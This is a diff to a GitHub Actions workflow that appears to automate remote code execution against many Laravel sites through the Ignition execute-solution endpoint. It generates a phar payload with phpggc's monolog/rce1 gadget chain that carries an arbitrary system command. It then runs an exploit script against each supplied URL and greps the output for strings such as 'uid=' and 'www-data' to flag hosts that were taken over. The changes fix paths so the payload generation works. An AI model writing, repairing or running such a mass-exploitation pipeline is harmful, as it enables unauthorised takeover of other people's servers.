@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       urls:
-        description: 'URLs separated by spaces, commas, or mashed together (Just base URL, e.g., http://x.com/)'
+        description: 'Full URLs including /_ignition/execute-solution (separated by spaces, commas, or mashed)'
         required: true
         type: string
       command:
@@ -42,11 +42,13 @@ jobs:
           CMD_INPUT: ${{ github.event.inputs.command }}
         run: |
           echo ">>> Generating exploit.phar for command: ${CMD_INPUT}"
-          # Generate the payload using phpggc (monolog/rce1 is standard for Laravel Ignition)
-          # phpggc runs natively without needing composer
-          php -d "phar.readonly=0" ./phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "$CMD_INPUT" || true
           
-          if [ ! -f "/tmp/exploit.phar" ]; then
+          # MUST cd into phpggc directory so it can find its internal gadget chains
+          cd phpggc
+          php -d "phar.readonly=0" ./phpggc --phar phar -o ../exploit.phar --fast-destruct monolog/rce1 system "$CMD_INPUT" || true
+          cd ..
+          
+          if [ ! -f "exploit.phar" ]; then
             echo "ERROR: Failed to generate exploit.phar!"
             exit 1
           fi
@@ -90,7 +92,8 @@ jobs:
             echo "======================================" >> "$RESULT_FILE"
             
             # Run the Python script with the generated phar file, 60s timeout
-            timeout 60 python3 laravel-exploits/laravel-ignition-rce.py "$url" /tmp/exploit.phar >> "$RESULT_FILE" 2>&1 || true
+            # Using absolute path for exploit.phar
+            timeout 60 python3 laravel-exploits/laravel-ignition-rce.py "$url" ${{ github.workspace }}/exploit.phar >> "$RESULT_FILE" 2>&1 || true
             
             # Check if the command output (e.g., 'uid=' from 'id') is in the result
             if grep -qi "uid=\|root\|nobody\|www-data\|daemon\|bin/bash\|total " "$RESULT_FILE"; then
